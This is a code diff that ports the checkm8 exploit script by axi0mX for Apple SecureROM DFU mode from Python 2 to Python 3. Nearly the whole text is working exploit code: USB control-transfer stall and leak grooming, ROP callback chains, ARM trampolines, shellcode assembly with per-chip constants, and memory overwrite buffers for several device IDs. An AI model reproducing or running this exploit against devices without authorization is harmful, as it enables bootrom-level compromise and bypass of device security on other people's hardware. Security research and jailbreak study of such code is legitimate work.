@@ -26,7 +26,7 @@ def libusb1_create_ctrl_transfer(device, request, timeout):
 
 def libusb1_async_ctrl_transfer(device, bmRequestType, bRequest, wValue, wIndex, data, timeout):
   if usb.backend.libusb1._lib is not device._ctx.backend.lib:
-    print 'ERROR: This exploit requires libusb1 backend, but another backend is being used. Exiting.'
+    print('ERROR: This exploit requires libusb1 backend, but another backend is being used. Exiting.')
     sys.exit(1)
 
   global request, transfer_ptr, never_free_device
@@ -40,7 +40,6 @@ def libusb1_async_ctrl_transfer(device, bmRequestType, bRequest, wValue, wIndex,
   while time.time() - start < timeout / 1000.0:
     pass
 
-  # Prototype of libusb_cancel_transfer is missing from pyusb
   usb.backend.libusb1._lib.libusb_cancel_transfer.argtypes = [ctypes.POINTER(usb.backend.libusb1._libusb_transfer)]
   assert usb.backend.libusb1._lib.libusb_cancel_transfer(transfer_ptr) == 0
 
@@ -51,10 +50,10 @@ def libusb1_no_error_ctrl_transfer(device, bmRequestType, bRequest, wValue, wInd
     pass
 
 def usb_rop_callbacks(address, func_gadget, callbacks):
-  data = ''
+  data = b''
   for i in range(0, len(callbacks), 5):
-    block1 = ''
-    block2 = ''
+    block1 = b''
+    block2 = b''
     for j in range(5):
       address += 0x10
       if j == 4:
@@ -73,15 +72,15 @@ def usb_rop_callbacks(address, func_gadget, callbacks):
 # TODO: assert we are within limits
 def asm_arm64_branch(src, dest):
   if src > dest:
-    value = 0x18000000 - (src - dest) / 4
+    value = 0x18000000 - (src - dest) // 4
   else:
-    value = 0x14000000 + (dest - src) / 4
+    value = 0x14000000 + (dest - src) // 4
   return struct.pack('<I', value)
 
 # TODO: check if start offset % 4 would break it
 # LDR X7, [PC, #OFFSET]; BR X7
 def asm_arm64_x7_trampoline(dest):
-  return '47000058E0001FD6'.decode('hex') + struct.pack('<Q', dest)
+  return bytes.fromhex('47000058E0001FD6') + struct.pack('<Q', dest)
 
 # THUMB +0 [0xF000F8DF, ADDR]  LDR.W   PC, [PC]
 # THUMB +2 [0xF002F8DF, ADDR]  LDR.W   PC, [PC, #2]
@@ -100,13 +99,12 @@ def prepare_shellcode(name, constants=[]):
     fmt = '<%sQ'
     size = 8
   else:
-    print 'ERROR: Shellcode name "%s" does not end with known architecture. Exiting.' % name
+    print('ERROR: Shellcode name "%s" does not end with known architecture. Exiting.' % name)
     sys.exit(1)
 
   with open('bin/%s.bin' % name, 'rb') as f:
     shellcode = f.read()
 
-  # Shellcode has placeholder values for constants; check they match and replace with constants from config
   placeholders_offset = len(shellcode) - size * len(constants)
   for i in range(len(constants)):
       offset = placeholders_offset + size * i
@@ -115,7 +113,7 @@ def prepare_shellcode(name, constants=[]):
 
   return shellcode[:placeholders_offset] + struct.pack(fmt % len(constants), *constants)
 
-def stall(device):   libusb1_async_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 'A' * 0xC0, 0.00001)
+def stall(device):   libusb1_async_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, b'A' * 0xC0, 0.00001)
 def leak(device):    libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC0, 1)
 def no_leak(device): libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC1, 1)
 
@@ -162,7 +160,7 @@ def payload(cpid):
     s5l8947x_shellcode = prepare_shellcode('checkm8_armv7', constants_checkm8_s5l8947x)
     assert len(s5l8947x_shellcode) <= PAYLOAD_OFFSET_ARMV7
     assert len(s5l8947x_handler) <= PAYLOAD_SIZE_ARMV7
-    return s5l8947x_shellcode + '\0' * (PAYLOAD_OFFSET_ARMV7 - len(s5l8947x_shellcode)) + s5l8947x_handler
+    return s5l8947x_shellcode + b'\0' * (PAYLOAD_OFFSET_ARMV7 - len(s5l8947x_shellcode)) + s5l8947x_handler
   if cpid == 0x8950:
     constants_usb_s5l8950x = [
                 0x10000000, # 1 - LOAD_ADDRESS
@@ -186,7 +184,7 @@ def payload(cpid):
     s5l8950x_shellcode = prepare_shellcode('checkm8_armv7', constants_checkm8_s5l8950x)
     assert len(s5l8950x_shellcode) <= PAYLOAD_OFFSET_ARMV7
     assert len(s5l8950x_handler) <= PAYLOAD_SIZE_ARMV7
-    return s5l8950x_shellcode + '\0' * (PAYLOAD_OFFSET_ARMV7 - len(s5l8950x_shellcode)) + s5l8950x_handler
+    return s5l8950x_shellcode + b'\0' * (PAYLOAD_OFFSET_ARMV7 - len(s5l8950x_shellcode)) + s5l8950x_handler
   if cpid == 0x8955:
     constants_usb_s5l8955x = [
                 0x10000000, # 1 - LOAD_ADDRESS
@@ -210,7 +208,7 @@ def payload(cpid):
     s5l8955x_shellcode = prepare_shellcode('checkm8_armv7', constants_checkm8_s5l8955x)
     assert len(s5l8955x_shellcode) <= PAYLOAD_OFFSET_ARMV7
     assert len(s5l8955x_handler) <= PAYLOAD_SIZE_ARMV7
-    return s5l8955x_shellcode + '\0' * (PAYLOAD_OFFSET_ARMV7 - len(s5l8955x_shellcode)) + s5l8955x_handler
+    return s5l8955x_shellcode + b'\0' * (PAYLOAD_OFFSET_ARMV7 - len(s5l8955x_shellcode)) + s5l8955x_handler
   if cpid == 0x8960:
     constants_usb_s5l8960x = [
                0x180380000, # 1 - LOAD_ADDRESS
@@ -234,7 +232,7 @@ def payload(cpid):
     s5l8960x_shellcode = prepare_shellcode('checkm8_arm64', constants_checkm8_s5l8960x)
     assert len(s5l8960x_shellcode) <= PAYLOAD_OFFSET_ARM64
     assert len(s5l8960x_handler) <= PAYLOAD_SIZE_ARM64
-    return s5l8960x_shellcode + '\0' * (PAYLOAD_OFFSET_ARM64 - len(s5l8960x_shellcode)) + s5l8960x_handler
+    return s5l8960x_shellcode + b'\0' * (PAYLOAD_OFFSET_ARM64 - len(s5l8960x_shellcode)) + s5l8960x_handler
   if cpid == 0x8002:
     constants_usb_t8002 = [
                 0x48818000, # 1 - LOAD_ADDRESS
@@ -258,7 +256,7 @@ def payload(cpid):
     t8002_shellcode = prepare_shellcode('checkm8_armv7', constants_checkm8_t8002)
     assert len(t8002_shellcode) <= PAYLOAD_OFFSET_ARMV7
     assert len(t8002_handler) <= PAYLOAD_SIZE_ARMV7
-    return t8002_shellcode + '\0' * (PAYLOAD_OFFSET_ARMV7 - len(t8002_shellcode)) + t8002_handler
+    return t8002_shellcode + b'\0' * (PAYLOAD_OFFSET_ARMV7 - len(t8002_shellcode)) + t8002_handler
   if cpid == 0x8004:
     constants_usb_t8004 = [
                 0x48818000, # 1 - LOAD_ADDRESS
@@ -278,11 +276,11 @@ def payload(cpid):
         PAYLOAD_SIZE_ARMV7, # 7 - PAYLOAD_SIZE
                 0x48806384, # 8 - PAYLOAD_PTR
     ]
-    t8004_handler = asm_thumb_trampoline(0x48806E00+1, 0x877C+1) + prepare_shellcode('usb_0xA1_2_armv7', constants_usb_t8004)[8:]    
+    t8004_handler = asm_thumb_trampoline(0x48806E00+1, 0x877C+1) + prepare_shellcode('usb_0xA1_2_armv7', constants_usb_t8004)[8:]
     t8004_shellcode = prepare_shellcode('checkm8_armv7', constants_checkm8_t8004)
     assert len(t8004_shellcode) <= PAYLOAD_OFFSET_ARMV7
     assert len(t8004_handler) <= PAYLOAD_SIZE_ARMV7
-    return t8004_shellcode + '\0' * (PAYLOAD_OFFSET_ARMV7 - len(t8004_shellcode)) + t8004_handler
+    return t8004_shellcode + b'\0' * (PAYLOAD_OFFSET_ARMV7 - len(t8004_shellcode)) + t8004_handler
   if cpid == 0x8010:
     constants_usb_t8010 = [
                0x1800B0000, # 1 - LOAD_ADDRESS
@@ -326,7 +324,7 @@ def payload(cpid):
     t8010_shellcode = prepare_shellcode('checkm8_arm64', constants_checkm8_t8010)
     assert len(t8010_shellcode) <= PAYLOAD_OFFSET_ARM64
     assert len(t8010_handler) <= PAYLOAD_SIZE_ARM64
-    t8010_shellcode = t8010_shellcode + '\0' * (PAYLOAD_OFFSET_ARM64 - len(t8010_shellcode)) + t8010_handler
+    t8010_shellcode = t8010_shellcode + b'\0' * (PAYLOAD_OFFSET_ARM64 - len(t8010_shellcode)) + t8010_handler
     assert len(t8010_shellcode) <= 0x400
     return struct.pack('<1024sQ504x2Q496s32x', t8010_shellcode, 0x1000006A5, 0x60000180000625, 0x1800006A5, prepare_shellcode('t8010_t8011_disable_wxn_arm64')) + usb_rop_callbacks(0x1800B0800, t8010_func_gadget, t8010_callbacks)
   if cpid == 0x8011:
@@ -370,7 +368,7 @@ def payload(cpid):
     t8011_shellcode = prepare_shellcode('checkm8_arm64', constants_checkm8_t8011)
     assert len(t8011_shellcode) <= PAYLOAD_OFFSET_ARM64
     assert len(t8011_handler) <= PAYLOAD_SIZE_ARM64
-    t8011_shellcode = t8011_shellcode + '\0' * (PAYLOAD_OFFSET_ARM64 - len(t8011_shellcode)) + t8011_handler
+    t8011_shellcode = t8011_shellcode + b'\0' * (PAYLOAD_OFFSET_ARM64 - len(t8011_shellcode)) + t8011_handler
     assert len(t8011_shellcode) <= 0x400
     return struct.pack('<1024sQ504x2Q496s32x', t8011_shellcode, 0x1000006A5, 0x60000180000625, 0x1800006A5, prepare_shellcode('t8010_t8011_disable_wxn_arm64')) + usb_rop_callbacks(0x1800B0800, t8011_func_gadget, t8011_callbacks)
   if cpid == 0x8015:
@@ -420,7 +418,7 @@ def payload(cpid):
     t8015_shellcode = prepare_shellcode('checkm8_arm64', constants_checkm8_t8015)
     assert len(t8015_shellcode) <= PAYLOAD_OFFSET_ARM64
     assert len(t8015_handler) <= PAYLOAD_SIZE_ARM64
-    t8015_shellcode = t8015_shellcode + '\0' * (PAYLOAD_OFFSET_ARM64 - len(t8015_shellcode)) + t8015_handler
+    t8015_shellcode = t8015_shellcode + b'\0' * (PAYLOAD_OFFSET_ARM64 - len(t8015_shellcode)) + t8015_handler
     return struct.pack('<6Q16x448s1536x1024s', 0x180020400-8, 0x1000006A5, 0x180020600-8, 0x180000625, 0x18000C600-8, 0x180000625, t8015_callback_data, t8015_shellcode)
 
 def all_exploit_configs():
@@ -428,13 +426,13 @@ def all_exploit_configs():
   t8011_nop_gadget = 0x10000CD0C
   t8015_nop_gadget = 0x10000A9C4
 
-  s5l8947x_overwrite = '\0' * 0x660 + struct.pack('<20xI4x', 0x34000000)
-  s5l895xx_overwrite = '\0' * 0x640 + struct.pack('<20xI4x', 0x10000000)
-  t800x_overwrite    = '\0' * 0x5C0 + struct.pack('<20xI4x', 0x48818000)
-  s5l8960x_overwrite = '\0' * 0x580 + struct.pack('<32xQ8x', 0x180380000)
-  t8010_overwrite    = '\0' * 0x580 + struct.pack('<32x2Q16x32x2QI',    t8010_nop_gadget, 0x1800B0800, t8010_nop_gadget, 0x1800B0800, 0xbeefbeef)
-  t8011_overwrite    = '\0' * 0x500 + struct.pack('<32x2Q16x32x2QI',    t8011_nop_gadget, 0x1800B0800, t8011_nop_gadget, 0x1800B0800, 0xbeefbeef)
-  t8015_overwrite    = '\0' * 0x500 + struct.pack('<32x2Q16x32x2Q12xI', t8015_nop_gadget, 0x18001C020, t8015_nop_gadget, 0x18001C020, 0xbeefbeef)
+  s5l8947x_overwrite = b'\0' * 0x660 + struct.pack('<20xI4x', 0x34000000)
+  s5l895xx_overwrite = b'\0' * 0x640 + struct.pack('<20xI4x', 0x10000000)
+  t800x_overwrite    = b'\0' * 0x5C0 + struct.pack('<20xI4x', 0x48818000)
+  s5l8960x_overwrite = b'\0' * 0x580 + struct.pack('<32xQ8x', 0x180380000)
+  t8010_overwrite    = b'\0' * 0x580 + struct.pack('<32x2Q16x32x2QI',    t8010_nop_gadget, 0x1800B0800, t8010_nop_gadget, 0x1800B0800, 0xbeefbeef)
+  t8011_overwrite    = b'\0' * 0x500 + struct.pack('<32x2Q16x32x2QI',    t8011_nop_gadget, 0x1800B0800, t8011_nop_gadget, 0x1800B0800, 0xbeefbeef)
+  t8015_overwrite    = b'\0' * 0x500 + struct.pack('<32x2Q16x32x2Q12xI', t8015_nop_gadget, 0x18001C020, t8015_nop_gadget, 0x18001C020, 0xbeefbeef)
 
   return [
     DeviceConfig('iBoot-1458.2',          0x8947,  626, s5l8947x_overwrite, None, None), # S5L8947 (DFU loop)     1.97 seconds
@@ -454,20 +452,20 @@ def exploit_config(serial_number):
       return payload(config.cpid), config
   for config in all_exploit_configs():
     if 'CPID:%s' % config.cpid in serial_number:
-      print 'ERROR: CPID is compatible, but serial number string does not match.'
-      print 'Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.'
+      print('ERROR: CPID is compatible, but serial number string does not match.')
+      print('Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.')
       sys.exit(1)
-  print 'ERROR: This is not a compatible device. Exiting.'
+  print('ERROR: This is not a compatible device. Exiting.')
   sys.exit(1)
 
 def exploit():
-  print '*** checkm8 exploit by axi0mX ***'
+  print('*** checkm8 exploit by axi0mX ***')
 
   device = dfu.acquire_device()
   start = time.time()
-  print 'Found:', device.serial_number
+  print('Found:', device.serial_number)
   if 'PWND:[' in device.serial_number:
-    print 'Device is already in pwned DFU Mode. Not executing exploit.'
+    print('Device is already in pwned DFU Mode. Not executing exploit.')
     return
   payload, config = exploit_config(device.serial_number)
 
@@ -487,7 +485,7 @@ def exploit():
 
   device = dfu.acquire_device()
   device.serial_number
-  libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001)
+  libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, b'A' * 0x800, 0.0001)
   libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
   dfu.release_device(device)
 
@@ -508,8 +506,8 @@ def exploit():
 
   device = dfu.acquire_device()
   if 'PWND:[checkm8]' not in device.serial_number:
-    print 'ERROR: Exploit failed. Device did not enter pwned DFU Mode.'
+    print('ERROR: Exploit failed. Device did not enter pwned DFU Mode.')
     sys.exit(1)
-  print 'Device is now in pwned DFU Mode.'
-  print '(%0.2f seconds)' % (time.time() - start)
+  print('Device is now in pwned DFU Mode.')
+  print('(%0.2f seconds)' % (time.time() - start))
   dfu.release_device(device)
